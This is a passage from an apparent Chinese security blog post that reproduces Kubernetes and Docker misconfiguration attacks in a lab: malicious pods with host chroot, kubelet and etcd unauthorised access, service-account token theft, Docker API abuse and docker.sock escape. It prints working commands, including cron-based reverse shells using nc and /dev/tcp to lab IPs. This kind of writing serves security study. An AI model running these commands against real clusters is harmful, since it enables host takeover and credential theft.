不过我又发现一个新的方法，虽然不知道是为什么，但是这个方法确实可行![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryFRcHXRGWe4wVWicTXa1B4BYMLR96Q7zibGXRNzvz0VVKmDyibxz9Be5ew/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

偶然发现，这里虽然会让你输入账号和密码，但是随便输入之后，还是会显示 pods，那么我通过 POST 创建 pods，然后我在用这里连上去，然后 chroot 去获取宿主机权限呢？

```
./kubectl --insecure-skip-tls-verify -s https://ip:6443 get pods
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLory2yfBgzPzL0W1GLCkqwAHJave6zLpdibAKzUymgDcwuQH52Kt8KQibENg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

可以看到，我们这里已经创建了恶意的 pods

```
./kubectl --insecure-skip-tls-verify -s https://ip:6443 --namespace=default exec -it test-4444 bash
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryNoLfhYvymVIwjNXAADWRotOYuxAy4PSL6YgGe4BibaUicicH42wXYh6Fw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

可以看到已经通过挂在宿主机根目录到 host 目录，通过 chroot 来到的宿主机，那么也可以看到我们 root 目录下的 metarget，创建一个文件看看![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLorycROoqHOm7tiaD6N0RIVI91zWfghwcOLBJt4hmtibboAwCWRAjNkHHwdg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

成功了，不过如果有 k8s 大佬知道这是为什么，可以告诉我，谢谢大佬，我的 Github 有我的微信二维码

五、**k8s kubelet 10250 端口未授权**
=============================

**正常访问该端口会提示未授权**![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLorycROoqHOm7tiaD6N0RIVI91zWfghwcOLBJt4hmtibboAwCWRAjNkHHwdg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

并且如果直接访问这个端口会提示 404![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLorytTZ8icHDkK3zKwOFqEcjMjM2xgZvYDhIRNPLHGkJ9ibgTFmicbsBRu6FA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

但是如果将 / var/lib/kubelet/config.yml 配置错误的修改为如下![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryqjr2T5GWaEyKntKwTiayP2ibfC86XFODtX27owBsYiabY7iaWKuiad10iakg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

随后将 authorization.mode 修改为 AlwaysAllow![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryZO8qa2xpgfiaaAqO2BjE3ibKwea5QmqM4d21dbibYBI9eBebicIRhluibsg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

随后重启

```
systemctl restart kubelet
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLory5Ms24Y5HCiby6b8ySjdZ8yP2eqaVqiafvKga8KcKOIibvkiblprocf0CHw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

再访问这个端口就会发现不需要认证，那么如何执行命令呢？

1、执行命令
------

```
curl -XPOST -k "https://${IP_ADDRESS}:10250/run/<namespace>/<pod>/<container>" -d "cmd=<command-to-run>"
```

这里需要三个参数

1、namespace

2、pod

3、container

在这里获取

```
https://8.210.134.222:10250/runningpods/
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLorybO5ibnOlSvX98gccJ2lgKOvfibgbG1CKnG6atSicR19KlZotG8fNFcoUA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryvt8cYOtlVgCjdiaR76bSajZlfeiakVSfyfAgxicKINTExpeozzj2CalbA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

2、获取凭证
------

```
curl -XPOST -k https://ip:10250/run/default/attacker/ubuntu -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```

一个 pod 与一个服务账户相关联，该服务账户的凭证（token）被放入该 pod 中每个容器的文件系统树，在 /var/run/secrets/kubernetes.io/serviceaccount/token

如果服务账号（Service account ）绑定了 cluster-admin （即集群的 admin 权限我们可以对所有 namespace 下实例进行操作） ，那么我们就可以通过 token 来进行一系列的操作![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryIcSm6Fk0vPuseJPocibqzmEUILFHnib1pV3Pcb0UmQ1TQCW3zSBlfGsg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

尝试了一下，这个 token 是可以登录 dashboard 的，那么如果绑定的权限够的话，完全可以通过这个 token 去登录 dashboard![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryeKjDpvFhmSibm0fjib2y3MomkPywDqHOiaAPtFfsYjcnWtKSrs7wZCibfQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

3、一些问题
------

### 3.1、authorization.mode.AlwaysAllow

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryzSwgicarX7WM6pMJ4Lzqia9CmNPtP5NmE7brnhzpCxswcj5ibf7PGDdbA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

将这里的 mode 设置为 AlwaysAllow 之后，那么使用 API 就不需要鉴权了，默认是使用 WebHook，在配置为 WebHook 请求的时候会返回如下![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLory9mUZhtpnjj8KC48PiaWJI4mjNpXRlEQibk1OwFNSf17IFKG7Rtoqo0Vg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

六、etcd 未授权
==========

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryAk5WzXLIwiax1EMlS2zA8V5XKJPibwe4l6CnDMS4nE2HLmX1kMhU4P5Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

为什么会出现 etcd 未授权
---------------

在启动 etcd 时，如果没有指定 --client-cert-auth 参数打开证书校验，并且把 listen-client-urls 监听修改为 0.0.0.0 那么也就意味着这个端口被暴露在外，如果没有通过安全组防火墙的限制，就会造成危害

etcd 默认端口 2379

ps: 不过在安装 k8s 之后默认的配置 2379 都只会监听 127.0.0.1，而不会监听 0.0.0.0，那么也就意味着最多就是本地访问，不能公网访问![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryU9Nm0MuIb2ay4COFBKB7P0Oo6Z2UtmtKKG6UV1SrjicyN2GtWFy10iag/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

那么我们看一下手动搭建的集群![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryOvfE4ZxYImBpuiamyqCibw55k6zvTGW54cpWhohXBlGJ6vyDYM3Wrpsw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

可以发现，除了监听本地的私有地址之外，也就只有 127.0.0.1 了

错误的配置 --client-cert-auth
------------------------

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryrXzoONOwAxIT2VzrKfjaXkqDPOtYQ5lSmHh1dIF9zmqshucAC4icNog/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

etcd 的配置文件在 / etc/kubernetes/manifests/etcd.yaml![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryelicX4kz7AQxpXRW5fX91NSZrGZrW7wa9R0wB1KTt88Xnsz7ic7Rdx7Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

如果此时将 --client-cert-auth 写入到这个配置文件里面

在打开证书校验选项后，通过本地 127.0.0.1:2379 地址可以免认证访问 Etcd 服务，但通过其他地址访问要携带 cert 进行认证访问

在未使用 client-cert-auth 参数打开证书校验时，任意地址访问 Etcd 服务都不需要进行证书校验，此时 Etcd 服务存在未授权访问风险。

证书泄露
----

默认情况下用 etcdctl 访问 2379 会需要证书![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLorywjEHY39VT6lPATX1DqtMmCnafmSHSsnnd7qBmBKBpvmU3EWdP1HXfQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

但是如果证书泄露了，就可以通过证书来获取 etcd

```
export ETCDCTL_CERT=/etc/kubernetes/pki/etcd/peer.crt
export ETCDCTL_CACERT=/etc/kubernetes/pki/etcd/ca.crt
export ETCDCTL_KEY=/etc/kubernetes/pki/etcd/peer.key
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLorye9H7kxkO5ZZ0JZu0bZnbhuzUrkmibHs8r8Mla9yuUVSC0qHtZpzxfPg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

获取 token

```
/etcdctl --endpoints=https://127.0.0.1:2379/ get --keys-only --prefix=true "/" | grep /secrets/kube-system/clusterrole
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryQAFRmsaq09qUIaljZ5FJguDY17zSYaibW5mcL8ial9bqC0Ez4Af3Oiatg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryKQCJNHWAcAfEZVQdEWrB3vSlACGjfib5tuQUjthXlqlIGicppQDcWz8Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

```
./etcdctl --endpoints=https://127.0.0.1:2379/ get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-fltzp
```

通过该 token 可以获取 k8s 集群的权限

```
kubectl --insecure-skip-tls-verify -s https://127.0.0.1:6443 --token="" -n kube-system get pods
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryGyibHF75cGIeue0ic7kJcFicv6HQXxTn9cM032u3ccpS2icVy3BGPiaE6jA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

不过这里需要注意，在 kubectl 1.2 的版本没有 insecure-skip-tls-verify 这个参数![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryM240DddB1cuicksaicXKLOAAv0d32wwYPyUnQsjcH6t6tTuB894MtZlg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

通过 kubectl opthion 也没有看到这个参数，但是我们在 1.16.6 版本中可以看到有这个参数![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryLictCuYlQrRkoY78Bib59voxib8Z3w9UTaK7svvibMhjbbY34qJB3C3YYg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryibHXg9gZibiaNJdW1nMJ7iaep9pIKwrwHL9MpB8jibq1JEQZUDTfrQ2ORPw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

### 如何安装指定版本的 kubectl

```
curl -LO "https://dl.k8s.io/release/{这里写你要下载的版本}/bin/darwin/amd64/kubectl"
# 例子
curl -LO "https://dl.k8s.io/release/v1.16.6/bin/darwin/amd64/kubectl"
```

七、k8s+Docker 会存在的问题
===================

以下举例了两个 docker 会造成的问题，因为 k8s+docker 是比较常见的组合，所以 docker 上存在的问题，自然也会带到 k8s 中，更多 docker 逃逸到我的博客

*   https://uzzju.com/?id=40
    

1、Docker API 未授权
----------------

因为现在常见的搭配还是 K8s+docker 的组合，那么 docker 上存在的问题，在这个组合中也必然会存在

漏洞原理：在使用 docker swarm 的时候，节点上会开放一个 TCP 端口 2375，绑定在 0.0.0.0 上，如果我们使用 HTTP 的方式访问会返回 404  利用思路：通过挂在宿主机的目录，写定时任务获取 SHELL，从而逃逸![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryfHTibFmbKKQlnHEXmXjmgEPezMN0px41qQqb9IwKexEHRMn3VIdYB5Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryZyh5uB2BP8ib1nXnkJDYpM6E91dbgx3Sxic3bqstD4jnwIssMVIbvx5w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

```
docker ps -a | grep rce
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLorykexOz2icYZpWtGUDgRov6CNDvS4OXoN1yoibE7ntTcRor7OeQgsKMySw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

访问 ip:2375/version 

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLorySk9xk6DcMkk2qZChZMHDYOvHiaFjxYdR6SItia9Lfhf43zWFhIBW1XjA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**payload**

```
import docker  client = docker.DockerClient(base_url='http://192.168.0.138:2375') data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc 192.168.0.138 1234 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'\}\}) print(data)
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryuutp7BA4lCnciasric0hgA67KbGnkK0tr08bPGDq0jXicq2XFlpwgLKDw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

2、挂载 docker.sock
----------------

### 2.1、什么是 docker.sock

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryMKL8xRcZaurmfXcelYtwECbMtYArZ0cvibJBXhLzQtWZ7y738XX8P9g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

/var/run/docker.sock 是 Docker 守护程序默认监听的 Unix 套接字。它也是一个用于从容器内与 Docker 守护进程通信的工具  **取自 StackOverflow**Unix Sockets  术语套接字通常是指 IP 套接字。这些是绑定到端口（和地址）的端口，我们向其发送 TCP 请求并从中获取响应。

另一种类型的 Socket 是 Unix Socket，这些套接字用于 IPC（进程间通信）。它们也称为 Unix 域套接字 (UDS)。Unix 套接字使用本地文件系统进行通信，而 IP 套接字使用网络。

Docker 守护进程可以通过三种不同类型的 Socket 监听 Docker Engine API 请求：unix, tcp, and fd.  默认情况下，在 /var/run/docker.sock 中创建一个 unix 域套接字（或 IPC 套接字）

### 2.2、创建 docker

```
docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:18.04
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryjfCUlRVKiaRTWByMDpPjUEuWxCDVbyd3k7PVv4XIAibSJObfTwpnh9Tg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

随后在 docker 容器中安装 docker

```
# ubuntu 18.04安装docker
sudo apt-get update
# 安装依赖包
sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common
# 添加 Docker 的官方 GPG 密钥
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
# 验证您现在是否拥有带有指纹的密钥
sudo apt-key fingerprint 0EBFCD88
# 设置稳定版仓库
sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
# 更新
$ sudo apt-get update
# 安装最新的Docker-ce
sudo apt-get install docker-ce
# 启动
sudo systemctl enable docker
sudo systemctl start docker
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryIIg3WwRDcMghlRr52y1YUu0ZxEicRdwP0dicyOia55urt3qZRIKiaORAxg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

安装完成之后我们使用 docker ps 就可以看到宿主机上的容器了

### 2.3、复现

将宿主机的根目录挂载到容器

```
docker run -it -v /:/uzju ubuntu:18.04 /bin/bash
```

```
chroot uzju
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryvh5C1M5P8nO4quW3Rr8HNdwZ8gRe1me1R4n57Hk9gfry9TZhXoGicCQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

可以看到宿主机 root 目录上的图片，反弹 shell 也是修改 crontab 即可

### 2.4、反弹 shell

通过修改 Crontab 定时任务来反弹 shell

```
crontab -e 
```

```
* * * * * /bin/bash -i >& /dev/tcp/192.168.0.139/123 0>&1
```

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLoryJecTdExy8Wc3icib2XvBD6yQ8IrMODrePtKzPPefEIrk73o2XX7IQWcg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/k3f2NkYgPf3xbuEU0yBhWDxqP9ibTLorysOcNC6ohaQThRMC8QQBDbxpq76QUOB2gtVLRl1ESBPMxACKq8SyfBg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

参考
==

*   https://security.tencent.com/index.php/blog/msg/183
    
*   https://javamana.com/2022/01/202201231236091126.html#kubernetes_1
    
*   http://jolestar.com/etcd-architecture/
    
*   https://blog.csdn.net/RivenDong/article/details/107566148
    
*   https://www.jianshu.com/p/141d6827b688
    
*   https://medium.com/@tejaswi.goudru/disable-authentication-https-in-kubernetes-dashboard-2fada478ce91
    
*   https://www.cdxy.me/?p=827
    
*   [https://mp.weixin.qq.com/s/WJ14yyrLptQnRovFoGYv8A](https://mp.weixin.qq.com/s?__biz=MzU3ODAyMjg4OQ==&mid=2247494368&idx=1&sn=c5eecd520fa7091d29db0dca6eb52a66&scene=21#wechat_redirect)
    

**侵权请私聊公众号删文**

 **热文推荐**  

*   [蓝队应急响应姿势之 Linux](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523380&idx=1&sn=27acf248b4bbce96e2e40e193b32f0c9&chksm=f9e3f36fce947a79b416e30442009c3de226d98422bd0fb8cbcc54a66c303ab99b4d3f9bbb05&scene=21#wechat_redirect)  
    
*   [通过 DNSLOG 回显验证漏洞](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523485&idx=1&sn=2825827e55c1c9264041744a00688caf&chksm=f9e3f3c6ce947ad0c129566e5952ac23c990cf0428704df1a51526d8db6adbc47f998ee96eb4&scene=21#wechat_redirect)  
    
*   [记一次服务器被种挖矿溯源](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523441&idx=2&sn=94c6fae1f131c991d82263cb6a8c820b&chksm=f9e3f32ace947a3cdae52cf4cdfc9169ecf2b801f6b0fc2312801d73846d28b36d4ba47cb671&scene=21#wechat_redirect)  
    
*   [内网渗透初探 | 小白简单学习内网渗透](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523346&idx=1&sn=4bf01626aa7457c9f9255dc088a738b4&chksm=f9e3f349ce947a5f934329a78177b9ce85e625a36039008eead2fe35cbad5e96a991569d0b80&scene=21#wechat_redirect)  
    
*   [实战 | 通过恶意 pdf 执行 xss 漏洞](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523274&idx=1&sn=89290e2b7a8e408ff62a657ef71c8594&chksm=f9e3f491ce947d8702eda190e8d4f7ea2e3721549c27a2f768c3256de170f1fd0c99e817e0fb&scene=21#wechat_redirect)  
    
*   [免杀技术有一套（免杀方法大集结）(Anti-AntiVirus)](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523189&idx=1&sn=44ea2c9a59a07847e1efb1da01583883&chksm=f9e3f42ece947d3890eb74e4d5fc60364710b83bd4669344a74c630ac78f689b1248a2208082&scene=21#wechat_redirect)  
    
*   [内网渗透之内网信息查看常用命令](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522979&idx=1&sn=894ac98a85ae7e23312b0188b8784278&chksm=f9e3f5f8ce947cee823a62ae4db34270510cc64772ed8314febf177a7660de08c36bedab6267&scene=21#wechat_redirect)  
    
*   [关于漏洞的基础知识](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523083&idx=2&sn=0b162aba30063a4073bad24269a8dc0e&chksm=f9e3f450ce947d4699dfebf0a60a2dade481d8baf5f782350c2125ad6a320f91a2854d027e85&scene=21#wechat_redirect)  
    
*   [任意账号密码重置的 6 种方法](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522927&idx=1&sn=075ccdb91ae67b7ad2a771aa1d6b43f3&chksm=f9e3f534ce947c220664a938bc42926bee3ca8d07c6e3129795d7c8977948f060b08c0f89739&scene=21#wechat_redirect)  
    
*   [干货 | 横向移动与域控权限维持方法总汇](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522810&idx=2&sn=ed65a8c60c45f9af598178ed20c89896&chksm=f9e3f6a1ce947fb710ff77d8fbd721220b16673953b30eba6b10ad6e86924f6b4b9b2a983e74&scene=21#wechat_redirect)  
    
*   [手把手教你 Linux 提权](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522500&idx=2&sn=ec74a21ef0a872f7486ccac6772e0b9a&chksm=f9e3f79fce947e89eac9d9077eee8ce74f3ab35a345b1c2194d11b77d5b522be3b269b326ebf&scene=21#wechat_redirect)
    

****欢迎关注 LemonSec****

**觉得不错点个 **“赞”**、“在看”**